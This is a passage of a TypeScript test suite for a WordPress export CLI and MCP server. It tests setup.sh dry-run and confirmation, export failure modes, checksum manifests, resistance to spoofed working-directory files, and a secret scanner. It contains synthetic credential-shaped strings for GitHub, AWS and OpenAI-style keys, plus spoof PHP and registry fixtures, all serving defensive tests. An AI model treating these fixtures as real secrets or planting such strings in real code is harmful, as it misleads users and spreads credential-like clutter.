      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(danglingDir, { recursive: true, force: true });
      fs.rmSync(secretDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('T7: setup.sh supports --dry-run and refuses to mutate non-interactively without --yes', () => {
    const srcDir = tmp('wpai-exp-src-');
    const outDir = tmp('wpai-exp-out-');
    const binDir = tmp('wpai-exp-bin-');
    try {
      writeBlueprint(srcDir, {
        steps: [{ step: 'setSiteOptions', options: { blogname: "O'Brien & Sons" } }],
      });
      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, true);
      const setupSh = path.join(outDir, 'setup.sh');
      assert.equal(spawnSync('bash', ['-n', setupSh]).status, 0, 'setup.sh must be valid bash');

      // Fake `wp` that records every invocation, so we can tell whether anything ran.
      const log = path.join(binDir, 'calls.log');
      fs.writeFileSync(path.join(binDir, 'wp'), `#!/usr/bin/env bash\necho "$*" >> '${log}'\n`, { mode: 0o755 });
      const env = { ...process.env, PATH: `${binDir}${path.delimiter}${process.env.PATH ?? ''}` };
      const run = (args: string[]) =>
        spawnSync('bash', [setupSh, ...args], { cwd: outDir, env, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] });

      const dry = run(['--dry-run']);
      assert.equal(dry.status, 0, dry.stderr);
      assert.match(dry.stdout, /\[dry-run\] wp option update blogname O\\'Brien\\ \\&\\ Sons/);
      assert.match(dry.stdout, /Dry run complete; nothing was changed/);
      assert.equal(fs.existsSync(log), false, '--dry-run must not invoke wp');

      const refused = run([]);
      assert.equal(refused.status, 1);
      assert.match(refused.stderr, /without --yes/);
      assert.equal(fs.existsSync(log), false, 'no mutation without confirmation');

      const unknown = run(['--force']);
      assert.equal(unknown.status, 2);

      const applied = run(['--yes']);
      assert.equal(applied.status, 0, applied.stderr);
      const calls = fs.readFileSync(log, 'utf8');
      assert.match(calls, /^option update blogname O'Brien & Sons$/m);
      assert.match(calls, /^rewrite flush --hard$/m);

      assert.match(fs.readFileSync(path.join(outDir, 'DEPLOY.md'), 'utf8'), /setup\.sh --dry-run/);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
      fs.rmSync(binDir, { recursive: true, force: true });
    }
  });

  it('CLI exits 1 without --allow-partial and 0 with it in --mode static and on untranslatable host steps', () => {
    const srcDir = tmp('wpai-exp-cli-src-');
    const hostUntranslatableDir = tmp('wpai-exp-cli-host-');
    const outRoot = tmp('wpai-exp-cli-out-');
    const outDir = path.join(outRoot, 'bundle');
    try {
      initProject({ preset: 'course', dir: srcDir, name: 'Pottery Studio' });

      const failed = runCli(['export', srcDir, '--out', outDir, '--mode', 'static', '--json']);
      assert.equal(failed.code, 1);
      const failedJson = JSON.parse(failed.stdout) as { ok: boolean; mode: string; skipped_steps: Array<{ step: string }> };
      assert.equal(failedJson.ok, false);
      assert.equal(failedJson.mode, 'static');
      assert.ok(failedJson.skipped_steps.some((s) => s.step === 'runPHP'));
      assert.equal(fs.existsSync(outDir), false);

      const human = runCli(['export', srcDir, '--out', outDir, '--mode=static']);
      assert.equal(human.code, 1);
      assert.match(human.stderr, /\[SKIPPED\] steps\[\d+\] \(runPHP\)/);
      assert.match(human.stderr, /--allow-partial/);

      // Default --mode auto also fast-fails before Playground boot when host-level constants exist
      writeBlueprint(hostUntranslatableDir, {
        constants: { WP_DEBUG: true },
        steps: [{ step: 'runPHP', code: "<?php require_once '/wordpress/wp-load.php';" }],
      });
      const hostFailed = runCli(['export', hostUntranslatableDir, '--out', outDir, '--json']);
      assert.equal(hostFailed.code, 1);
      const hostFailedJson = JSON.parse(hostFailed.stdout) as { ok: boolean; mode: string; skipped_steps: Array<{ step: string }> };
      assert.equal(hostFailedJson.ok, false);
      assert.equal(hostFailedJson.mode, 'materialized');
      assert.ok(hostFailedJson.skipped_steps.some((s) => s.step === 'constants'));
      assert.equal(fs.existsSync(outDir), false);

      const partial = runCli(['export', srcDir, '--out', outDir, '--mode', 'static', '--allow-partial', '--json']);
      assert.equal(partial.code, 0, partial.stderr);
      const partialJson = JSON.parse(partial.stdout) as { ok: boolean; complete: boolean; wp_content_files: string[] };
      assert.equal(partialJson.ok, true);
      assert.equal(partialJson.complete, false);
      assert.ok(partialJson.wp_content_files.length >= 1);

      const explicit = runCli(['export', srcDir, '--out', outDir, '--mode', 'static', '--allow-partial=true', '--json']);
      assert.equal(explicit.code, 0, explicit.stderr);
      assert.equal((JSON.parse(explicit.stdout) as { ok: boolean }).ok, true);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(hostUntranslatableDir, { recursive: true, force: true });
      fs.rmSync(outRoot, { recursive: true, force: true });
    }
  });

  it('MCP wpai_export returns isError without allow_partial in static or untranslatable cases and succeeds with it', async () => {
    const srcDir = tmp('wpai-exp-mcp-src-');
    const hostDir = tmp('wpai-exp-mcp-host-');
    const outDir = tmp('wpai-exp-mcp-out-');
    try {
      initProject({ preset: 'small-business', dir: srcDir, name: 'Sunrise Bakery' });
      const call = (target: string, args: Record<string, unknown>) =>
        handleMcpRequest({
          jsonrpc: '2.0',
          id: 1,
          method: 'tools/call',
          params: { name: 'wpai_export', arguments: { target, out_dir: outDir, ...args } },
        });

      const failed = (await call(srcDir, { mode: 'static' })) as {
        result: { isError: boolean; content: Array<{ text: string }> };
      };
      assert.equal(failed.result.isError, true);
      assert.equal((JSON.parse(failed.result.content[0]!.text) as { ok: boolean }).ok, false);

      writeBlueprint(hostDir, {
        constants: { WP_CACHE: true },
        steps: [{ step: 'runPHP', code: "<?php require_once '/wordpress/wp-load.php';" }],
      });
      const hostFailed = (await call(hostDir, {})) as {
        result: { isError: boolean; content: Array<{ text: string }> };
      };
      assert.equal(hostFailed.result.isError, true);

      const partial = (await call(srcDir, { mode: 'static', allow_partial: true })) as {
        result: { isError: boolean; content: Array<{ text: string }> };
      };
      assert.equal(partial.result.isError, false);
      assert.equal((JSON.parse(partial.result.content[0]!.text) as { complete: boolean }).complete, false);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(hostDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });

  it('T2/T5: emits verifiable MANIFEST.sha256, PHP SHA-256 inventory, and secret_warnings without leaking raw tokens', () => {
    const srcDir = tmp('wpai-exp-manifest-src-');
    const outDir = tmp('wpai-exp-manifest-out-');
    // Synthetic test-only strings matching common credential prefixes (never real keys)
    const fakeSk = `sk-proj-${'A1b2C3d4E5f6'.repeat(2)}`;
    const fakeGhp = `ghp_${'Z9y8X7w6V5u4'.repeat(2)}`;
    const fakeAkia = 'AKIAIOSFODNN7EXAMPLE';
    try {
      writeBlueprint(srcDir, {
        steps: [
          { step: 'setSiteOptions', options: { blogname: 'Manifest Site' } },
          {
            step: 'writeFile',
            path: '/wordpress/wp-content/mu-plugins/custom-integration.php',
            data: `<?php\n// synthetic token check\n$k1 = '${fakeSk}';\n$k2 = '${fakeGhp}';\n$k3 = '${fakeAkia}';\n`,
          },
        ],
      });

      const directScan = scanSecretTokens('test.php', `$a = "${fakeSk}";`);
      assert.equal(directScan.length, 1);
      assert.equal(directScan[0]?.pattern, 'openai-or-anthropic-secret-key');
      assert.doesNotMatch(JSON.stringify(directScan), new RegExp(fakeSk));

      const res = exportForProduction({ target: srcDir, outDir });
      assert.equal(res.ok, true);
      assert.ok(res.files_written.includes('MANIFEST.sha256'));
      assert.ok(res.secret_warnings.length >= 3);
      assert.doesNotMatch(
        JSON.stringify(res.secret_warnings),
        new RegExp(`${fakeSk}|${fakeGhp}|${fakeAkia}`),
        'secret_warnings must never echo matched token strings'
      );

      const deployMd = fs.readFileSync(path.join(outDir, 'DEPLOY.md'), 'utf8');
      assert.match(deployMd, /## PHP Code Inventory/);
      assert.match(deployMd, /wp-content\/mu-plugins\/custom-integration\.php` \(`sha256:[0-9a-f]{64}`\)/);
      assert.match(deployMd, /Security review warning/);
      assert.doesNotMatch(deployMd, new RegExp(`${fakeSk}|${fakeGhp}|${fakeAkia}`));

      const shaCheck = spawnSync('sha256sum', ['-c', 'MANIFEST.sha256'], { cwd: outDir, encoding: 'utf8' });
      assert.equal(shaCheck.status, 0, shaCheck.stderr || shaCheck.stdout);
    } finally {
      fs.rmSync(srcDir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  });
});

describe('wpai bundled asset resolution precedence', () => {
  it('resolves standalone verify-probe.php from bundled/package assets and ignores spoofed cwd files', () => {
    const spoofDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-spoof-probe-'));
    const origCwd = process.cwd();
    try {
      fs.mkdirSync(path.join(spoofDir, 'php'), { recursive: true });
      fs.writeFileSync(path.join(spoofDir, 'php', 'verify-probe.php'), '<?php die("spoof");', 'utf8');
      process.chdir(spoofDir);
      const probe = findVerifyProbePhpPath();
      assert.ok(fs.existsSync(probe));
      assert.ok(!probe.startsWith(spoofDir), `Expected package probe path, got ${probe}`);
    } finally {
      process.chdir(origCwd);
      fs.rmSync(spoofDir, { recursive: true, force: true });
    }
  });
  it('prefers bundled package assets over untrusted files in process.cwd() unless an explicit path is passed', () => {
    const spoofDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-spoof-cwd-'));
    try {
      fs.mkdirSync(path.join(spoofDir, 'registry'), { recursive: true });
      fs.writeFileSync(
        path.join(spoofDir, 'registry', 'wp-capabilities.json'),
        '{ not valid json',
        'utf8'
      );

      // Default resolution ignores poisoned cwd file and uses bundled package asset
      const res = runCli(['check-fit', 'website for my bakery', '--json'], { cwd: spoofDir });
      assert.equal(res.code, 0, res.stderr);
      const parsed = JSON.parse(res.stdout) as { decision: string; wordpress_fit: boolean };
      assert.equal(parsed.decision, 'recommended');
      assert.equal(parsed.wordpress_fit, true);

      // Explicit --registry still takes highest precedence
      const explicitRes = runCli(
        ['check-fit', 'website for my bakery', '--registry', path.join(spoofDir, 'registry', 'wp-capabilities.json'), '--json'],
        { cwd: spoofDir }
      );
      assert.equal(explicitRes.code, 1);
    } finally {
      fs.rmSync(spoofDir, { recursive: true, force: true });
    }
  });

  it('copy-assets.mjs requires all 6 preset blueprints before replacing or accepting bundled assets', () => {
    const fakeRepo = fs.mkdtempSync(path.join(os.tmpdir(), 'wpai-copy-assets-'));
    try {
      const repoRoot = path.resolve(__dirname, '../../../..');
      const scriptSrc = path.join(repoRoot, 'packages', 'wpai-cli', 'scripts', 'copy-assets.mjs');
      const fakePkg = path.join(fakeRepo, 'packages', 'wpai-cli');
      const fakeScript = path.join(fakePkg, 'scripts', 'copy-assets.mjs');
      fs.mkdirSync(path.dirname(fakeScript), { recursive: true });
      fs.copyFileSync(scriptSrc, fakeScript);

      // Valid registry & skill sources, but incomplete source blueprints (only small-business)
      fs.mkdirSync(path.join(fakeRepo, 'registry'), { recursive: true });
      fs.writeFileSync(path.join(fakeRepo, 'registry', 'wp-capabilities.json'), '{}');
      fs.mkdirSync(path.join(fakeRepo, 'skills', 'wp-platform-selection'), { recursive: true });
      fs.writeFileSync(path.join(fakeRepo, 'skills', 'wp-platform-selection', 'SKILL.md'), '# skill');
      fs.mkdirSync(path.join(fakeRepo, 'blueprints', 'small-business'), { recursive: true });
      fs.writeFileSync(path.join(fakeRepo, 'blueprints', 'small-business', 'blueprint.json'), '{"incomplete":true}');

      // Pre-populate a complete pre-bundled assets/blueprints with a sentinel marker
      const assetsBlueprints = path.join(fakePkg, 'assets', 'blueprints');
      for (const preset of PRESET_NAMES) {
        fs.mkdirSync(path.join(assetsBlueprints, preset), { recursive: true });
        fs.writeFileSync(path.join(assetsBlueprints, preset, 'blueprint.json'), '{"sentinel":"keep"}');
      }

      const keepRes = spawnSync(process.execPath, [fakeScript], { encoding: 'utf8' });
      assert.equal(keepRes.status, 0, keepRes.stderr);
      assert.equal(
        fs.readFileSync(path.join(assetsBlueprints, 'small-business', 'blueprint.json'), 'utf8'),
        '{"sentinel":"keep"}',
        'incomplete source must not overwrite a complete pre-bundled copy'
      );

      // Make pre-bundled copy incomplete too (remove migration/blueprint.json) -> must fail while keeping remaining files
      fs.rmSync(path.join(assetsBlueprints, 'migration', 'blueprint.json'));
      const failRes = spawnSync(process.execPath, [fakeScript], { encoding: 'utf8' });
      assert.notEqual(failRes.status, 0, 'must reject when both source and pre-bundled copy are incomplete');
      assert.equal(
        fs.readFileSync(path.join(assetsBlueprints, 'small-business', 'blueprint.json'), 'utf8'),
        '{"sentinel":"keep"}'
      );
    } finally {
      fs.rmSync(fakeRepo, { recursive: true, force: true });
    }
  });
});

describe('wpai mcp (MCP JSON-RPC 2.0 server)', () => {
  it('handles initialize, tools/list, tools/call (check_fit & catalog), and both resources/read URIs', async () => {
    const initResp = await handleMcpRequest({
      jsonrpc: '2.0',
      id: 1,
      method: 'initialize',
      params: { protocolVersion: '2024-11-05' },
    });
    assert.ok(initResp && !initResp.error);
    const initRes = initResp.result as { serverInfo: { name: string }; protocolVersion: string };
    assert.equal(initRes.serverInfo.name, 'wpai');

    const listResp = await handleMcpRequest({ jsonrpc: '2.0', id: 2, method: 'tools/list' });
    assert.ok(listResp && !listResp.error);
    const tools = (listResp.result as { tools: Array<{ name: string }> }).tools;
    assert.equal(tools.length, 6);
    assert.ok(tools.some((t) => t.name === 'wpai_check_fit'));
    assert.ok(tools.some((t) => t.name === 'wpai_export'));

    const fitResp = await handleMcpRequest({
      jsonrpc: '2.0',
      id: 3,
      method: 'tools/call',
      params: { name: 'wpai_check_fit', arguments: { prompt: 'website for my bakery' } },
    });
    assert.ok(fitResp && !fitResp.error);
    const fitCall = fitResp.result as { isError: boolean; content: Array<{ text: string }> };
    assert.equal(fitCall.isError, false);
    const fitJson = JSON.parse(fitCall.content[0]!.text) as { wordpress_fit: boolean; decision: string };
    assert.equal(fitJson.wordpress_fit, true);
    assert.equal(fitJson.decision, 'recommended');

    const catResp = await handleMcpRequest({
      jsonrpc: '2.0',
      id: 4,
      method: 'tools/call',
      params: { name: 'wpai_catalog', arguments: {} },
    });
    assert.ok(catResp && !catResp.error);
    const catJson = JSON.parse(
      (catResp.result as { content: Array<{ text: string }> }).content[0]!.text
    ) as { presets: string[] };
    assert.equal(catJson.presets.length, 6);

    const resRead = await handleMcpRequest({
      jsonrpc: '2.0',
      id: 5,
      method: 'resources/read',
      params: { uri: 'wpai://registry/capabilities' },
    });
    assert.ok(resRead && !resRead.error);
    const contents = (resRead.result as { contents: Array<{ mimeType: string; text: string }> }).contents;
    assert.equal(contents[0]?.mimeType, 'application/json');
    assert.ok(JSON.parse(contents[0]!.text).registry_version);

    const skillRead = await handleMcpRequest({
      jsonrpc: '2.0',
      id: 6,
      method: 'resources/read',
      params: { uri: 'wpai://skill/platform-selection' },
    });
    assert.ok(skillRead && !skillRead.error);
    const skillContents = (skillRead.result as { contents: Array<{ mimeType: string; text: string }> }).contents;
    assert.equal(skillContents[0]?.mimeType, 'text/markdown');
    assert.ok(skillContents[0]!.text.includes('wp-platform-selection'));
  });
});

